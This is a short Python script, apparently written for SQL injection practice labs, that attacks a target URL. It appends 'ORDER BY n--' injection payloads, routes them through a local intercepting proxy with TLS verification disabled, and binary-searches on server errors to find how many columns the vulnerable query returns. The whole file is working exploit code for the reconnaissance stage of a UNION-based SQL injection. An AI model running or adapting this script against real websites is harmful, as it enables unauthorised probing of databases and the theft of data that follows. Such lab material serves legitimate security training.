import sys
import urllib3
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies= {
            'http': 'http://127.0.0.1:8080' ,
            'https':'http://127.0.0.1:8080' 
        }

def exployt_no_column(url):
    def cause_error(n):
        sql_payload= f"'+order+by+{n}--"
        r=requests.get(url + sql_payload, verify=False, proxies=proxies)
        if r.status_code>=500:
            return True

    low,high,best=1,25,0
    while low <= high:
        mid=(low+high)//2
        if cause_error(mid):
            high= mid - 1
        else:
            best= mid
            low= mid + 1
    return best if best > 0 else False
            

if __name__== "__main__" :
    try:
        base_url = sys.argv[1].strip()
    except IndexError:
        print("usage: python script.py <url> <payload> ")
        sys.exit(-1)
    no_column= exployt_no_column(base_url)
    if no_column:
        print(f"The number of column is {no_column}")
    else:
        print("The SQLi attack was not succesfull.")

    

